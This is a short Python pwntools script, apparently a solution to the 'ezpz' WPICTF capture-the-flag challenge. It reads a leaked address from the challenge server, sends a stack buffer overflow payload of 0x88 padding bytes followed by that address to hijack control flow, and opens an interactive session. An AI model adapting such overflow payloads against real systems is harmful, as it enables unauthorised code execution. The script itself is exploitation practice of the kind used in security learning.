from pwn import *

r = remote('ezpz.wpictf.xyz', 31337)

addr = int(r.recvline().split()[1], 16)

r.sendline('A' * 0x88 + p64(addr))

r.interactive()
